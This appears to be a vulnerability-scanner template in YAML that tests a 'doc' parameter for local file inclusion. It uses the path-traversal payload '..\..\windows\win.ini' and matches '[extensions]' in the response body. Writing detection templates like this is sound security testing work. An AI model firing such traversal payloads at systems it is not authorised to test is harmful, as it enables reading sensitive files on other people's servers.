id: lfi6-0882
name: 'Traversal in doc'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via doc'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      doc:
        - '..\..\windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
